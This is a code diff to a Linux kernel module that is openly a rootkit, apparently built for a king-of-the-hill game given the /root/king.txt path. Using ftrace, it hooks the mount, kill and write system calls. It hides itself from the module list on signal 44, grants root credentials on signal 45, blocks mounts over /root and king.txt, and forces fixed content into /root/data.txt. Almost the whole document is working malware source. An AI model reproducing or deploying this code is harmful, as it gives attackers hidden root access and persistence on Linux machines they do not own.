@@ -1,12 +1,15 @@
+#include <linux/init.h> 
 #include <linux/module.h>
 #include <linux/kernel.h> 
-#include <linux/cred.h>     // for struct creds, prepare_creds, commit_creds
-#include <linux/fs.h>       
-#include <linux/uaccess.h>  // for copy_to_user
-#include <linux/slab.h>     // for kmalloc and kfree
-#include <linux/dcache.h>   // for dentry_path_raw 
-#include <linux/file.h>     // for fget and fput
-#include <linux/ptrace.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/version.h>
+#include <linux/cred.h>
+#include <linux/namei.h>
+#include <linux/fs.h>
+#include <linux/fdtable.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
 
 #include "ftrace_helper.h"
 
@@ -16,16 +19,20 @@ MODULE_DESCRIPTION("LKM Library");
 MODULE_VERSION("0.02");
 
 #define TARGET_FILE "/root/data.txt"
-#define DATA "data\n"
-#define DATA_LEN (strlen(DATA))
+#define TARGET_CONTENT "hello\n"
+#define TARGET_CONTENT_SIZE (sizeof(TARGET_CONTENT) - 1)
+
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
 
 static struct list_head *prev_module;
 static short hidden = 0;
 
-
+#ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_mount)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
-static asmlinkage long (*orig_read)(const struct pt_regs *);
+static asmlinkage long (*orig_write)(const struct pt_regs *);
 
 asmlinkage long hook_mount(const struct pt_regs *regs)
 {
@@ -94,69 +101,118 @@ asmlinkage long hook_kill(const struct pt_regs *regs)
     return orig_kill(regs);
 }
 
+asmlinkage long hook_write(const struct pt_regs *regs)
+{
+    int fd = regs->di;
+    size_t count = regs->dx;
+    struct file *file;
+    struct path path;
+    char *buf_path = kmalloc(PATH_MAX, GFP_KERNEL);
+    char *tmp;
 
-asmlinkage ssize_t hook_read(struct pt_regs *regs){
-   struct file *file;
-   char *buff;
-   char *absolute_path;
-   
-   unsigned int fd = regs->si;
-   char __user *buf = (void *) regs->di;
-   size_t count = regs->dx;
-
-   file = fget(fd);
-   if (!file) return -EBADF;
-
-   buff = kmalloc(PATH_MAX, GFP_KERNEL);
-   if (!buff){
-        fput(file);
+    if (!buf_path)
         return -ENOMEM;
-   }
-   
-   absolute_path = dentry_path_raw(file->f_path.dentry, buff, PATH_MAX);
 
-   if (strcmp(absolute_path, TARGET_FILE) == 0){
-        loff_t pos;
-        ssize_t ret;
-
-        // make the file size equal to DATA_LEN
-        // even if the file had nothing or less that
-        // DATA len the len will always be equal 
-        // to DATA_LEN
-        vfs_truncate(&file->f_path, DATA_LEN);
-
-        pos = file->f_pos;
-
-        // this is cause no more bytes can be read
-        // and we use this to indicate EOF (end of file)
-        if (pos ==  DATA_LEN){
-           ret = 0; 
-           goto done;
-        } 
-
-        if (count > DATA_LEN) count = DATA_LEN;
-        count = count  - pos;
-        
-        if (copy_to_user(buf, DATA, DATA_LEN)){
-            ret = -EFAULT;
-            goto done;
+    file = fcheck(fd);
+    if (file) {
+        path = file->f_path;
+        path_get(&file->f_path);
+        tmp = d_path(&path, buf_path, PATH_MAX);
+        path_put(&path);
+        if (!IS_ERR(tmp) && strcmp(tmp, TARGET_FILE) == 0) {
+            file = filp_open(TARGET_FILE, O_WRONLY | O_CREAT, 0644);
+            if (!IS_ERR(file)) {
+                kernel_write(file, TARGET_CONTENT, TARGET_CONTENT_SIZE, 0);
+                filp_close(file, NULL);
+            }
+            kfree(buf_path);
+            return count; 
         }
+    }
 
-        file->f_pos += count;
-        ret = count;
-        goto done;
-
-       done:
-            kfree(buff);
-            fput(file);
-            return ret;
-
-   }
-
-   kfree(buff);
-   fput(file);
-   return orig_read(regs);
+    kfree(buf_path);
+    return orig_write(regs);
 }
+#else
+static asmlinkage long (*orig_mount)(char *dev_name, char *dir_name, char *type, unsigned long flags, void *data);
+static asmlinkage long (*orig_kill)(pid_t pid, int sig);
+static asmlinkage long (*orig_write)(unsigned int fd, const char __user *buf, size_t count);
+
+asmlinkage long hook_mount(char *dev_name, char *dir_name, char *type, unsigned long flags, void *data)
+{
+    char *dir_buf = kmalloc(PATH_MAX, GFP_KERNEL);
+
+    if (!dir_buf)
+        return -ENOMEM;
+
+    if (copy_from_user(dir_buf, dir_name, PATH_MAX)) {
+        kfree(dir_buf);
+        return -EFAULT;
+    }
+
+    if (strcmp(dir_buf, "/") == 0 || strcmp(dir_buf, "/root") == 0 || strcmp(dir_buf, "/root/king.txt") == 0) {
+        kfree(dir_buf);
+        return -EPERM;
+    }
+
+    kfree(dir_buf);
+    return orig_mount(dev_name, dir_name, type, flags, data);
+}
+
+asmlinkage long hook_kill(pid_t pid, int sig)
+{
+    void showme(void);
+    void hideme(void);
+    void set_root(void);
+
+    if (sig == 44 && hidden == 0) {
+        hideme();
+        hidden = 1;
+        return 0;
+    } else if (sig == 44 && hidden == 1) {
+        showme();
+        hidden = 0;
+        return 0;
+    } else if (sig == 45) {
+        set_root();
+        return 0;
+    }
+
+    return orig_kill(pid, sig);
+}
+
+asmlinkage long hook_write(unsigned int fd, const char __user *buf, size_t count)
+{
+    struct file *file;
+    struct path path;
+    char *buf_path = kmalloc(PATH_MAX, GFP_KERNEL);
+    char *tmp;
+
+    if (!buf_path)
+        return -ENOMEM;
+
+    file = fcheck(fd);
+    if (file) {
+        path = file->f_path;
+        path_get(&file->f_path);
+        tmp = d_path(&path, buf_path, PATH_MAX);
+        path_put(&path);
+        if (!IS_ERR(tmp) && strcmp(tmp, TARGET_FILE) == 0) {
+            file = filp_open(TARGET_FILE, O_WRONLY | O_CREAT, 0644);
+            if (!IS_ERR(file)) {
+                kernel_write(file, TARGET_CONTENT, TARGET_CONTENT_SIZE, 0);
+                filp_close(file, NULL);
+            }
+            kfree(buf_path);
+            return count; 
+        }
+    }
+
+    kfree(buf_path);
+    return orig_write(fd, buf, count);
+}
+#endif
+
 void showme(void)
 {
     list_add(&THIS_MODULE->list, prev_module);
@@ -186,10 +242,10 @@ void set_root(void)
 static struct ftrace_hook hooks[] = {
     HOOK("sys_mount", hook_mount, &orig_mount),
     HOOK("sys_kill", hook_kill, &orig_kill),
-    HOOK("sys_read", hook_read, &orig_read),
+    HOOK("sys_write", hook_write, &orig_write),
 };
 
-static int rootkit_init(void)
+static int __init rootkit_init(void)
 {
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
@@ -199,7 +255,7 @@ static int rootkit_init(void)
     return 0;
 }
 
-static void rootkit_exit(void)
+static void __exit rootkit_exit(void)
 {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 }
